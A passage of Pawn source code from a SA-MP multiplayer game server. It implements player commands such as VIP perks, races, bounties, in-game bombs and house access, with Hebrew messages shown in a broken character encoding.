			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,vipcol);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			SendClientMessage(playerid,vipcol," .äåôñ÷ VIP öáò");
			SetPlayerColor(playerid,GetColor(playerid,153));
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/vmessage"))
	{
		new text[256], string[M_S];
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][vip] < 2) return SendClientMessage(playerid,red," .2 VIP áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîú");
		if((chatlocked || playerinfo[playerid][mute][0] > 0) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ìà úåëì ìäùúîù áô÷åãä äæå áîöáê äðåëçé");
		text = strrest(cmdtext,idx);
		if(!strlen(text)) return SendClientMessage(playerid,white," /vmessage [text] :öåøú äùéîåù");
		if(equal(playerinfo[playerid][lastvmessage],text)) return SendClientMessage(playerid,red," !vmessage àñåø ìäöéó á");
		format(string,sizeof(string)," ** [VIP Message] %s: %s",GetName(playerid),text);
		SendClientMessageToAll(vipcol,string);
		SetString(playerinfo[playerid][lastvmessage],text);
		return 1;
	}
	if(equal(cmd,"/vheal"))
	{
		new string[M_S];
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][vip] < 2) return SendClientMessage(playerid,red," .2 VIP áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîú");
		if(playerinfo[playerid][vheal] >= 3) return SendClientMessage(playerid,red," .úåëì ìäùúîù áô÷åãä æå ùåá ø÷ ìàçø ùúöà");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vheal [id/name] :öåøú äùéîåù");
		new id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		SetPlayerHealth2(id,100.0);
		SetPlayerArmour2(id,100.0);
		playerinfo[playerid][vheal]++;
		if(id == playerid)
		{
			format(string,sizeof(string)," .äùúîùú áøéôåé ä # %d ùìê (îúåê 3) òì òöîê",playerinfo[playerid][vheal]);
			SendClientMessage(playerid,green,string);
		}
		else
		{
			format(string,sizeof(string)," .%s äùúîùú áøéôåé ä # %d ùìê (îúåê 3) òì ",GetName(id),playerinfo[playerid][vheal]);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .VIP øéôà àåúê áàîöòåú ëåç ä %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		if(playerinfo[playerid][vheal] >= 3) SendClientMessage(playerid,red," .òã ùúöà /vheal ìà úåëì ìäùúîù éåúø áô÷åãú äøéôåé");
		return 1;
	}
	if(equal(cmd,"/vrocket"))
	{
		new string[M_S];
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][vip] < 3) return SendClientMessage(playerid,red," .3 VIP áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîú");
		if(playerinfo[playerid][vrocket]) return SendClientMessage(playerid,red," .úåëì ìäùúîù áô÷åãä æå ùåá ø÷ ìàçø ùúöà");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vrocket [id/name] :öåøú äùéîåù");
		new id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][vip] > 0) return SendClientMessage(playerid,red," .VIP ìà ðéúï ìäùúîù áô÷åãä æå òì îùúîùé");
		playerinfo[playerid][vrocket] = 1;
		CallRemoteFunction("SAM_lunch","d",id);
		format(string,sizeof(string)," .%s ùìçú èéì àì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .VIP ùìç àìééê èéì áàîöòåú ëåç ä %s",GetName(playerid));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/vsuicide") || equal(cmd,"/vs"))
	{
		new Float:h;
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][vip] < 3) return SendClientMessage(playerid,red," .3 VIP áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîú");
		GetPlayerHealth(playerid,h);
		if(h > 25.0) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå öøéëéí ìäéåú ìê î÷ñéîåí 25%% çééí");
		playerinfo[playerid][vsuicide][0] = 0;
		playerinfo[playerid][vsuicide][1] = SetTimerEx("VIPSuicide",800,1,"d",playerid);
		SendClientMessage(playerid,green," .VIP áéöòú äúàáãåú ùì ëåç ä");
		return 1;
	}
	if(equal(cmd,"/testsound"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testsound [sound id] :öåøú äùéîåù");
		new s = strval(cmd);
		if(!IsValidSound(s) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .ñàåðã àééãé ùâåé");
		PlayerPlaySound(playerid,s,0.0,0.0,0.0);
		return 1;
	}
	if(!strcmp(cmd,"/testexp",true) && IsPlayerMAdmin(playerid))
	{
		new id;
		cmd = strtok(cmdtext, idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,red,"[USAGE]: /testexp [explosion id] [rad] :öåøú äùéîåù");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		id = strval(cmd), cmd = strtok(cmdtext,idx);
		CreateExplosion(p[0]+15.0,p[1],p[2],id,floatstr(cmd));
		return 1;
	}
	if(equal(cmd,"/srace"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /srace [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /srace state :äöâú îöá äîéøåõ äðåëçé");
			SendClientMessage(playerid,white," /srace join :äöèøôåú ìîéøåõ");
			SendClientMessage(playerid,white," /srace quit :ôøéùä îîéøåõ");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /srace start :äúçìú îéøåõ çãù");
				SendClientMessage(playerid,white," /srace end [reason] :ñéåí äîéøåõ äðåëçé");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(sraceinfo[0])
			{
				if(sraceinfo[2] > 1)
				{
					format(string,sizeof(string)," .éù îéøåõ åäéöéàä ìãøê úúçéì áòåã %d ùðéåú",sraceinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .éù îéøåõ åäåà ëáø äúçéì");
			}
			else SendClientMessage(playerid,red," .àéï ëòú îéøåõ");
		}
		else if(equal(cmd,"join"))
		{
			if(!sraceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitsrace]) return SendClientMessage(playerid,red," .äîéøåõ éúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú");
			if(playerinfo[playerid][insrace]) return SendClientMessage(playerid,red," .àúä ëáø áîéøåõ");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(GetMoney(playerid) < 500) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 500$");
			if(sraceinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			SendClientMessage(playerid,green," .äöèøôú ìîéøåõ äîéåçã áäöìçä, àðà äîúï ìúçéìúå");
			GiveMoney(playerid,0-500);
			playerinfo[playerid][waitsrace] = 1;
			playerinfo[playerid][sraceid] = sraceinfo[1];
			sraceinfo[1]++;
			format(string,sizeof(string)," + !äöèøó ìîéøåõ äîéåçã %s",GetName(playerid));
			SendClientMessageToAll(green,string);
			SendClientMessage(playerid,lightblue," ~~~ :äöèøôú ìîéøåõ äîéåçã ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìò÷åó àú ùàø äîúçøéí ùîéøåõ ììà øëáéí");
			SendClientMessage(playerid,yellow,"  !äîéøåõ îçåì÷ ìçì÷éí ùì øéöä, ùçééä åàôéìå úòåôä");
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",sraceinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!sraceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			if(!playerinfo[playerid][insrace]) return SendClientMessage(playerid,red," .àúä ìà áîéøåõ");
			SendClientMessage(playerid,green," .ôøùú äîéåçã îäîéøåõ");
			DisablePlayerRaceCheckpoint(playerid);
			playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0;
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			format(string,sizeof(string)," - !ôøù îäîéøåõ äîéåçã %s",GetName(playerid));
			SendClientMessageToAll(red,string);
			sraceinfo[1]--;
			playerinfo[playerid][inact] = 0;
			if(sraceinfo[1] < 3) EndSRace(" çåñø ùç÷ðéí",-1);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(sraceinfo[0]) return SendClientMessage(playerid,red," .ëáø éù îéøåõ îéåçã");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			StartSRace();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!sraceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndSRace(reason,playerid);
		}
		else SendClientMessage(playerid,red," .àôùøåú îéøåõ ùâåéä");
		return 1;
	}
	if(equal(cmd,"/hitman"))
	{
		new id, amount, string[M_S], cmd2[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /hitman [id] [amount] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(id == playerid) return SendClientMessage(playerid,red," .ìà ðéúï ìùéí ëñó òì òöîê");
		amount = strval(cmd2);
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .îñôø ëñó ùâåé");
		playerinfo[id][hitman] += amount;
		GiveMoney(playerid,0-amount);
		format(string,sizeof(string)," .%s ùîú %d$ òì",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ùí òìéê %d$ %s",amount,GetName(playerid));
		SendClientMessage(id,red,string);
		format(string,sizeof(string)," .åëòú éù òìéå %d$ %s ùí %d$ òì %s",playerinfo[id][hitman],GetName(id),amount,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) if(i != playerid && i != id) SendClientMessage(i,lightblue,string);
		return 1;
	}
	if(equal(cmd,"/bounty"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /bounty [id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(id == playerid)
		{
			format(string,sizeof(string)," .éù òìéê %d$",playerinfo[playerid][hitman]);
			SendClientMessage(playerid,green,playerinfo[id][hitman] == 0? (" .àéï òìéê ëñó"):(string));
		}
		else
		{
			format(string,sizeof(string)," .%s éù %d$ òì",GetName(id),playerinfo[id][hitman]);
			SendClientMessage(playerid,green,playerinfo[id][hitman] == 0? (" .àéï ëñó òì äùç÷ï ùáçøú"):(string));
		}
		return 1;
	}
	if(equal(cmd,"/buybomb"))
	{
		if(playerinfo[playerid][level] < 6) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 6");
 		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][frozen]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ÷ôåà");
		if(playerinfo[playerid][bomb] > 0) return SendClientMessage(playerid,red," .ëáø éù ìê ôööä");
		ShowMenuForPlayer(bombshop,playerid);
		SetFreeze(playerid,1);
		SendClientMessage(playerid,lightblue," ~~~ :áøåê äáà ìçðåú äôööåú ~~~");
		SendClientMessage(playerid,yellow," - Help ìäöâú îéãò àåãåú äôööåú, ìçõ òì");
		SendClientMessage(playerid,yellow," - áî÷ìãú Enter ìéöéàä îäçðåú ìçõ òì äëôúåø");
		return 1;
	}
	if(equal(cmd,"/usebomb"))
	{
		if(playerinfo[playerid][level] < 6) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 6");
		if(!playerinfo[playerid][bomb]) return SendClientMessage(playerid,red," .àéï ìê ôööä");
 		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		new Float:p[3], pid[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.0);
		switch(playerinfo[playerid][bomb])
		{
			case 1: // Bomb
			{
				SendClientMessage(playerid,red," !äðçú ôööä åäéà úúôåöõ áòåã 10 ùðéåú");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
			}
			case 2: // Super bomb
			{
				SendClientMessage(playerid,red," !äðçú ñåôø ôööä åäéà úúôåöõ áòåã 10 ùðéåú");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0]+1.0,p[1],p[2],0.0,0.0,0.0);
				pid[1] = CreateSObject(1654,p[0]-1.0,p[1],p[2],0.0,0.0,0.0);
				pid[2] = CreateSObject(1654,p[0],p[1],p[2]+1.0,0.0,0.0,0.0);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],pid[1],pid[2]);
			}
			case 3: // Time bomb
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /usebomb [seconds] :îëéååï ùéù ìê ôööä òì æîï, òìéê ìä÷ìéã îñôø ùðéåú");
				new string[M_S], time = strval(cmd);
				if(time < 1 || time > 60) return SendClientMessage(playerid,red," .îñôø ùðéåú âãåì àå ÷èï îãé");
				format(string,sizeof(string)," !äðçú ôööú æîï åäéà úúôåöõ áòåã %d ùðéåú",time);
				SendClientMessage(playerid,red,time? (" !äðçú ôööú æîï åäéà úúôåöõ áòåã ùðééä"):(string));
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",time*1000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
			}
			case 4: // Invisible bomb
			{
				SendClientMessage(playerid,red," !äðçú ôööä áéìúé ðøàú åäéà úúôåöõ áòåã 10 ùðéåú");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],-1,-1,-1);
			}
			case 5: // Atom bomb
			{
				SendClientMessage(playerid,red," !äðçú ôööú àèåí åäéà úúôåöõ áòåã 30 ùðéåú");
				SetTimerEx("Explosion",30000,0,"iiiii",playerid,playerinfo[playerid][bomb],-1,-1,-1);
				playerinfo[playerid][bombtime] = 0;
			}
			case 6: // Hydrogen bomb
			{
				SendClientMessage(playerid,red," !äðçú ôööú îéîï åäéà úúôåöõ áòåã 30 ùðéåú");
				pid[0] = CreateSObject(3786,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",30000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
				playerinfo[playerid][bombtime] = 0;
			}
		}
		for(new i=0;i<3;i++) playerinfo[playerid][bombpos][i] = p[i];
		return 1;
	}
	if(equal(cmd,"/myskin"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_clothes || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äáâãéí áëãé ìáöò ôòåìä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /myskin [skin id] :öåøú äùéîåù");
		new sskin = strval(cmd), string[M_S];
		if(!IsValidSkin(sskin)) return SendClientMessage(playerid,red," .îñôø ãîåú ùâåé");
		SetPlayerSkin(playerid,sskin);
		format(string,sizeof(string)," .ùéðéú àú äãîåú ùìê ìãîåú îñôø %d",sskin);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/classes"))
	{
		ForceClassSelection(playerid);
		SetPlayerHealth2(playerid,0.0);
		playerinfo[playerid][reqclass] = 1;
		SendClientMessage(playerid,green," .äçæøú àú òöîê ìîñê áçéøú äãîåéåú");
		return 1;
	}
	if(equal(cmd,"/csrandom"))
	{
		new newpic = playerinfo[playerid][pic];
		switch(playerinfo[playerid][classselection])
		{
			case 1:
			{
				do newpic = random(sizeof(Pictures));
				while newpic == playerinfo[playerid][pic];
			}
			case 2:
			{
				do newpic = random(sizeof(Pictures2));
				while newpic == playerinfo[playerid][pic];
			}
		}
		playerinfo[playerid][pic] = newpic;
		SendClientMessage(playerid,green," .úîåðú îñê áçéøú äãîåéåú ùìê äùúðúä");
		return 1;
	}
	if(equal(cmd,"/save2") && IsPlayerMAdmin(playerid))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /save2 [pos name] :öåøú äùéîåù");
		new Float:p[4], string[M_S], File:f;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		format(string,sizeof(string),"%.4f,%.4f,%.4f,%.4f // %s",p[0],p[1],p[2],p[3],cmd);
		f = fopen("/DM/Positions.txt",fexist("/DM/Positions.txt")? io_write:io_append);
		fwrite(f,string);
		fclose(f);
		SendClientMessage(playerid,green," .ðùîø");
		return 1;
	}
	if(equal(cmd,"/house"))
	{
		if(playerinfo[playerid][house] == -1) return SendClientMessage(playerid,red," .àéï ìê áéú");
		if(!playerinfo[playerid][houseacc][playerinfo[playerid][house]]) return SendClientMessage(playerid,red," .àéï ìê âéùä ìáéú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /house teleport :ùéðåé ùéâåø äáéú");
			SendClientMessage(playerid,white," /house giveacc [id/name] :ðúéðú âéùä ìáéú");
			SendClientMessage(playerid,white," /house removeacc [id/name] :îçé÷ú âéùä ìáéú");
			SendClientMessage(playerid,white," /house sell :îëéøú äáéú");
			SendClientMessage(playerid,white," /house acclist :øùéîú áòìé äâéùåú ìáéú");
			SendClientMessage(playerid,white," /house nremoveacc [name] :îçé÷ú âéùä ìáéú ìùç÷ï ìà îçåáø");
			SendClientMessage(playerid,white," /house removeallacc :àéôåñ øùéîú äâéùåú ìáéú ùìê");
			return 1;
		}
		new f[M_S], string[M_S], h = playerinfo[playerid][house];
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		if(equal(cmd,"teleport"))
		{
			new Float:p[4];
			if(IsPlayerInAnyVehicle(playerid))
			{
				GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
			}
			else
			{
				GetPlayerPos(playerid,p[0],p[1],p[2]);
				GetPlayerFacingAngle(playerid,p[3]);
			}
			if(GetPlayerDistanceToPointEx(playerid,houseinfo[h][hx],houseinfo[h][hy],houseinfo[h][hz]) > 85.0) return SendClientMessage(playerid,red," .äîé÷åí äæä øçå÷ îãé îäáéú ùìê");
			for(new i=0;i<4;i++) houseinfo[playerinfo[playerid][house]][hp][i] = p[i];
			fsetfloat(f,"X",p[0]);
			fsetfloat(f,"Y",p[1]);
			fsetfloat(f,"Z",p[2]);
			fsetfloat(f,"A",p[3]);
			SendClientMessage(playerid,orange," .ùéðéú àú îé÷åí äùéâåø ìáéú ùìê");
		}
		else if(equal(cmd,"giveacc"))
		{
			new accs = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string)) accs++;
			}
			if(accs >= max_houseacc-1) return SendClientMessage(playerid,red," .ìà ðéúï ìúú îòì " #max_houseacc " âéùåú");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house giveacc [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			CheckHouseAcc(id,h);
			if(playerinfo[id][houseacc][h]) return SendClientMessage(playerid,red," .ìîùúîù äæä ëáø éù ìâéùä ìáéú ùìê");
			playerinfo[id][houseacc][h] = 1;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(!fkeyexist(f,string))
				{
					fsetstring(f,string,GetName(id));
					break;
				}
			}
			format(string,sizeof(string)," .%s ðúú âéùä ìáéú ùìê ì",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .ðúï ìê âéùä ìáéú ùìå %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		else if(equal(cmd,"removeacc"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house removeacc [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			CheckHouseAcc(id,h);
			if(!playerinfo[id][houseacc][h]) return SendClientMessage(playerid,red," .ìîùúîù äæä àéï âéùä ìáéú ùìê");
			if(id == playerid) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå òì òöîê");
			playerinfo[id][houseacc][h] = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && equal(GetName(id),fgetstring(f,string)))
				{
					fremovekey(f,string);
					break;
				}
			}
			format(string,sizeof(string)," .%s äåøãú àú âéùä ìáéú ùìê ì",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äåøéã ìê àú äâéùä ìáéú ùìå %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		else if(equal(cmd,"sell"))
		{
			fsetfloat(f,"X",houseinfo[h][hx]);
			fsetfloat(f,"Y",houseinfo[h][hy]);
			fsetfloat(f,"Z",houseinfo[h][hz]);
			fsetfloat(f,"A",0.0);
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string)) fremovekey(f,string);
			}
			houseinfo[h][hp][0] = houseinfo[h][hx],
			houseinfo[h][hp][1] = houseinfo[h][hy],
			houseinfo[h][hp][2] = houseinfo[h][hz],
			houseinfo[h][hp][3] = 0.0;
			GiveMoney(playerid,houseinfo[h][hcost]);
			playerinfo[playerid][house] = -1,
			playerinfo[playerid][houseacc][h] = 0;
			for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][houseacc][h]) playerinfo[i][houseacc][h] = 0;
			fsetstring(f,"Owner","None");
			fsetint(fuser(playerid),"House1",-1);
			format(string,sizeof(string)," .%d$ îëøú àú áéúê å÷éáìú",houseinfo[h][hcost]);
			SendClientMessage(playerid,orange,string);
			PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		}
		else if(equal(cmd,"acclist"))
		{
			new accs = 0, list[M_S];
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú áòìé äâéùåú ìáéú ùìê ~~~");
			for(new i=0;i<max_houseacc;i+=2)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(!fkeyexist(f,string)) if(i == max_houseacc-1) break; else continue;
				format(list,sizeof(list)," %d. %s",++accs,fgetstring(f,string));
				format(string,sizeof(string),"Acc%d",++i);
				if(!fkeyexist(f,string))
				{
					if(i == max_houseacc-1)
					{
						accs++;
						SendClientMessage(playerid,yellow,list);
						break;
					}
					else continue;
				}
				format(list,sizeof(list),"%s  %d. %s",list,++accs,fgetstring(f,string));
				SendClientMessage(playerid,yellow,list);
				list = "";
			}
			if(!accs) return SendClientMessage(playerid,red," .àéï áòìé âéùåú ìáéú ùìê");
			format(string,sizeof(string)," .ñê äëì %d îùúîùéí áòìé âéùä",accs);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"nremoveacc"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house nremoveacc [name] :öåøú äùéîåù");
			if(!IsValidNick(cmd)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
			if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå òì òöîê");
			new accID = -1;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && equal(cmd,fgetstring(f,string)))
				{
					accID = i;
					break;
				}
			}
			if(accID == -1) return SendClientMessage(playerid,red," .äëéðåé ìà ðîöà áøùéîú áòìé äâéùä ìáéúê");
			format(string,sizeof(string),"Acc%d",accID);
			fremovekey(f,string);
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),cmd))
				{
					playerinfo[i][houseacc][h] = 0;
					format(string,sizeof(string)," .äåøéã ìê àú äâéùä ìáéú ùìå %s",GetName(playerid));
					SendClientMessage(i,green,string);
					break;
				}
			}
			format(string,sizeof(string)," .%s äåøãú àú âéùä ìáéú ùìê ì",cmd);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"removeallacc"))
		{
			new accs = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && !equal(GetName(playerid),fgetstring(f,string)))
				{
					accs++;
					fremovekey(f,string);
				}
			}
			if(!accs) return SendClientMessage(playerid,red," .àéï áòìé âéùåú ìáéú ùìê");
